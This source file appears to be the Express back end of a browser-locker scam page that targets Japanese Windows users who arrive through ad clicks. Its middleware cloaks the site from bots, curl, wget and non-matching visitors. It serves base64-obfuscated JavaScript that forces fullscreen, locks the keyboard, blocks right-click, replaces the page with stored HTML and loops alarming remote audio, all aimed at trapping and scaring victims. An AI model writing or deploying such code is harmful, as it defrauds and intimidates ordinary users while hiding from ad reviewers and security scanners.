import express from "express";
import cors from "cors";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const ALLOWED_ORIGIN = "https://sage-horse-b7caad.netlify.app";

// Helper to resolve relative paths (ESM compatible)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(
  cors({
    origin: ALLOWED_ORIGIN,
    credentials: true,
  })
);

app.use(express.json());

// Middleware for security checks
function validateRequest(req, res, next) {
  const origin = req.get("origin");
  if (origin !== ALLOWED_ORIGIN) {
    return res.status(403).send("FAILED: origin check");
  }

  const ua = req.get("user-agent")?.toLowerCase() || "";
  const blockedAgents = ["bot", "spider", "crawler", "curl", "wget"];
  const isWindows = ua.includes("windows");
  if (blockedAgents.some((a) => ua.includes(a)) || !isWindows) {
    return res.status(403).send("FAILED: bot or not Windows");
  }

  const timezone = req.get("x-client-timezone");
  if (!["Asia/Tokyo", "Japan"].includes(timezone)) {
    return res.status(403).send("FAILED: wrong timezone");
  }

  const cookie = req.get("x-access-cookie");
  if (cookie !== "true") {
    return res.status(403).send("FAILED: cookie missing");
  }

  next();
}

// === Endpoint: GET /bot-remover ===
app.get("/bot-remover", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  try {
    const htmlPath = path.join(__dirname, "asset.html");
    const html = await fs.readFile(htmlPath, "utf-8");
    res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
    return res.send(html);
  } catch (err) {
    return res.status(500).send("FAILED: could not read local asset");
  }
});

// === Endpoint: GET /frontend-loader ===
app.get("/frontend-loader", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  try {
    const htmlPath = path.join(__dirname, "asset.html");
    const someRandomString = await fs.readFile(htmlPath, "utf-8");
    const sanitizedHTML = JSON.stringify(someRandomString); // escape for JS

    const code = `
      document.documentElement.requestFullscreen().then(() => {
        document.body.innerHTML = ${sanitizedHTML};
        navigator.keyboard.lock();
        document.addEventListener('contextmenu', e => e.preventDefault());
        const audio1 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
        audio1.loop = true;
        audio1.play();
        const mumbaiAudio = new Audio('https://audio.jukehost.co.uk/TiYldVqiRFah8SdaoR0nWNvyv20wGngh');
        mumbaiAudio.loop = true;
        mumbaiAudio.play();
        document.removeEventListener("click", handleSomeClick);
      });
    `;

    const encoded = Buffer.from(code).toString("base64");
    res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
    return res.json({ code: encoded });
  } catch (err) {
    console.error("Error in frontend-loader:", err);
    return res.status(500).json({ error: "Failed to generate frontend loader" });
  }
});

// === Start server ===
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
